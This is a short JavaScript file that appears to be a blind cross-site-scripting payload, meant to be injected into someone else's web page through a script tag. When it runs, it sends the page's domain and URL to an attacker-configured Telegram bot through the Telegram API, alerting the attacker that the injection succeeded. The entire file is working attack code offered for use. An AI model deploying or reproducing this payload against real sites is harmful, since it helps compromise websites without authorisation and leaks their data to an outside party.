// Usage: <script src="//your.host/telegram-xss.js">
var tokenBot = "",
    chatId = "";
function telegramSend(e, t) {
    var a = "XSS Alert in " + document.domain + "%0d%0a------------------------------------------------%0d%0a%0d%0a-+URL+Target+-%0d%0a`" + document.URL + "`",
        d = new XMLHttpRequest();
console.log(a);
    d.open("GET", "https://api.telegram.org/bot" + e + "/sendMessage?chat_id=" + t + "&text=" + a.replace(/&/g, "%26") + "&parse_mode=markdown"),
    d.send();
}
telegramSend(tokenBot, chatId);
